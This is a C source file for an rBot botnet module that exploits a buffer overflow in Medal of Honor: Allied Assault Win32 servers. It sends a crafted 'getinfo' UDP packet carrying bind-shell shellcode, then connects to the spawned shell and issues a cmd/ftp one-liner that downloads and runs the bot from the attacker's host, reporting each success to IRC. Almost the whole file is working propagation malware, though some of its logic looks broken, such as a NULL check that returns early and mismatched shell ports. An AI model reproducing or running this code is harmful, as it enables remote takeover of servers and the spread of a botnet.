/* 
MOHAA Win32 Server Buffer-Overflow Exploit (getinfo) 
Written by RunningBon 
Ported to rBot by Affix 

*/ 

#include "..\Inc.h"
#include "..\Fun.h"
#include "..\Ext.h"


#ifndef NO_MOHAA 

#pragma comment(linker, "/IGNORE:2143 ") 

struct VersionStruct { 
    char *pName; 
    DWORD dwNewEIP; 
    DWORD dwFillLength; 
}; 

VersionStruct Versions[] = { 
    "MOHAA", 0xCBB935, 516, 
    "MOHAA", 0x923575, 516, 
}; 

#pragma comment (lib, "ws2_32.lib") 

//Port 8555 bindshell 
unsigned char szShellcode[] = 
"\x33\xc9\x83\xe9\xb0\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x74"
"\xf6\x8e\x58\x83\xeb\xfc\xe2\xf4\x88\x9c\x65\x15\x9c\x0f\x71\xa7"
"\x8b\x96\x05\x34\x50\xd2\x05\x1d\x48\x7d\xf2\x5d\x0c\xf7\x61\xd3"
"\x3b\xee\x05\x07\x54\xf7\x65\x11\xff\xc2\x05\x59\x9a\xc7\x4e\xc1"
"\xd8\x72\x4e\x2c\x73\x37\x44\x55\x75\x34\x65\xac\x4f\xa2\xaa\x70"
"\x01\x13\x05\x07\x50\xf7\x65\x3e\xff\xfa\xc5\xd3\x2b\xea\x8f\xb3"
"\x77\xda\x05\xd1\x18\xd2\x92\x39\xb7\xc7\x55\x3c\xff\xb5\xbe\xd3"
"\x34\xfa\x05\x28\x68\x5b\x05\x18\x7c\xa8\xe6\xd6\x3a\xf8\x62\x08"
"\x8b\x20\xe8\x0b\x12\x9e\xbd\x6a\x1c\x81\xfd\x6a\x2b\xa2\x71\x88"
"\x1c\x3d\x63\xa4\x4f\xa6\x71\x8e\x2b\x7f\x6b\x3e\xf5\x1b\x86\x5a"
"\x21\x9c\x8c\xa7\xa4\x9e\x57\x51\x81\x5b\xd9\xa7\xa2\xa5\xdd\x0b"
"\x27\xa5\xcd\x0b\x37\xa5\x71\x88\x12\x9e\xaf\x33\x12\xa5\x07\xb9"
"\xe1\x9e\x2a\x42\x04\x31\xd9\xa7\xa2\x9c\x9e\x09\x21\x09\x5e\x30"
"\xd0\x5b\xa0\xb1\x23\x09\x58\x0b\x21\x09\x5e\x30\x91\xbf\x08\x11"
"\x23\x09\x58\x08\x20\xa2\xdb\xa7\xa4\x65\xe6\xbf\x0d\x30\xf7\x0f"
"\x8b\x20\xdb\xa7\xa4\x90\xe4\x3c\x12\x9e\xed\x35\xfd\x13\xe4\x08"
"\x2d\xdf\x42\xd1\x93\x9c\xca\xd1\x96\xc7\x4e\xab\xde\x08\xcc\x75"
"\x8a\xb4\xa2\xcb\xf9\x8c\xb6\xf3\xdf\x5d\xe6\x2a\x8a\x45\x98\xa7"
"\x01\xb2\x71\x8e\x2f\xa1\xdc\x09\x25\xa7\xe4\x59\x25\xa7\xdb\x09"
"\x8b\x26\xe6\xf5\xad\xf3\x40\x0b\x8b\x20\xe4\xa7\x8b\xc1\x71\x88"
"\xff\xa1\x72\xdb\xb0\x92\x71\x8e\x26\x09\x5e\x30\x84\x7c\x8a\x07"
"\x27\x09\x58\xa7\xa4\xf6\x8e\x58";


void Error(char *pString) 
{ 
    printf("[ERROR] %s\n", pString); 
    ExitProcess(0); 
} 

int mohaa(char *pIP, VersionStruct *pVersion) 
{ 
    WSAData WSADATA; 
    SOCKET Socket = NULL; 
    sockaddr_in SockAddr; 
    char szHeader[] = "\xff\xff\xff\xff\x02getinfo "; 
    char szBuffer[4096]; 
    int iLen = 0; 

    WSAStartup(MAKEWORD(1, 1), &WSADATA); 

    if((Socket = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) == SOCKET_ERROR) 
    { 
        Error("socket()"); 
        return 0; 
    } 

    SockAddr.sin_addr.s_addr = inet_addr(pIP); 
    SockAddr.sin_port = htons(12203); 
    SockAddr.sin_family = AF_INET; 

    printf("Building packet.\n"); 

    memset(szBuffer, 0, sizeof(szBuffer)); 

    memcpy(szBuffer, szHeader, sizeof(szHeader) - 1); 
    iLen += sizeof(szHeader) - 1; 

    memset(szBuffer + iLen, 'z', pVersion->dwFillLength); 
    iLen += pVersion->dwFillLength; 

    memcpy(szBuffer + iLen, (LPVOID)&pVersion->dwNewEIP, sizeof(DWORD)); 
    iLen += sizeof(DWORD); 

    memcpy(szBuffer + iLen, szShellcode, sizeof(szShellcode)); 
    iLen += sizeof(szShellcode); 

    if(sendto(Socket, szBuffer, iLen, 0, (sockaddr*)&SockAddr, sizeof(SockAddr)) == SOCKET_ERROR) 
    { 
        Error("sendto()"); 
        return 0; 
    } 

    return 1; 
} 


BOOL ConnectShellMOHAA(EXINFO exinfo, unsigned short connectport) { 
   int len; 
   char recvbuf[1024]; 
   char mkdir_buff[400]; 

   SOCKET sockfd; 
   SOCKADDR_IN shell_addr; 
   ZeroMemory(&shell_addr, sizeof(shell_addr)); 

   shell_addr.sin_family = AF_INET; 
   shell_addr.sin_addr.s_addr = inet_addr(exinfo.ip); 
   shell_addr.sin_port = htons(connectport); 

   if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET) 
      return FALSE; 
   if (connect(sockfd,(LPSOCKADDR)&shell_addr, sizeof(shell_addr)) == SOCKET_ERROR) 
      return FALSE; 

   len = recv(sockfd, recvbuf, 1024, 0); 

   _snprintf(mkdir_buff, sizeof(mkdir_buff), 
      "cmd /c echo open %s %d >> ii &echo user 1 1 >> ii &echo get %s >> ii &echo bye >> ii &ftp -n -v -s:ii &del ii &%s\r\n", 
      GetIP(exinfo.sock),FTP_PORT, filename, filename); 

   if (send(sockfd, mkdir_buff, strlen(mkdir_buff),0) == -1) 
      return FALSE; 

   len = recv(sockfd, recvbuf, 1024, 0); 
   closesocket(sockfd); 
   return TRUE; 
} 

int expmohaa(EXINFO exinfo) 
{ 
    VersionStruct *pVersion = NULL; 

    if(pVersion == NULL) 
    { 
        return FALSE; 
    } 
    
   irc_sendv(exinfo.sock,"%s %s: Exploiting IP: %s", "MOHAA", exploit[exinfo.exploit].name, exinfo.ip); 
    
   for(int i = 0; i < sizeof(Versions) / sizeof(Versions[0]); i++) { 
         pVersion = &Versions[i]; 

         if (mohaa(exinfo.ip, &Versions[i])) {       
               if (ConnectShellMOHAA(exinfo, 4444)) { 

               exploit[exinfo.exploit].stats++; 

               return TRUE; 
               } 
         } 

         if (&Versions[i] == 0) { 
            Sleep(2000); 
      } 

      return FALSE; 
   } 

    return 0; 
} 

#endif 